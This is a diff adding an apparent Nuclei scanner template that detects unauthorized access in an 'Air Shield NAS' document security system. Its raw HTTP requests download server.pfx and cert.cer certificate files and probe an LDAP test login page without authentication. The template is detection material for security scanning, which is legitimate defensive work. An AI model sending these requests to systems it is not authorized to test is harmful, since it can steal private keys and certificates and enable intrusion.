@@ -1,0 +1,44 @@
+id: air-shield-nas-unauthorized-access
+info:
+  name: Air Shield NAS Unauthorized Access
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    Air Shield NAS electronic document security management system allows unauthorized access to certain webpages and the ability to download sensitive certificate files.
+  tags: unauthorized, information-disclosure
+http:
+  - raw:
+      - |
+        GET /sp/html/certs/server.pfx HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
+  - raw:
+      - |
+        GET /sp/html/certs/cert.cer HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "application/x-x509-ca-cert"
+  - raw:
+      - |
+        GET /sp/Ldaptest_login.jsp?specUsers=test HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
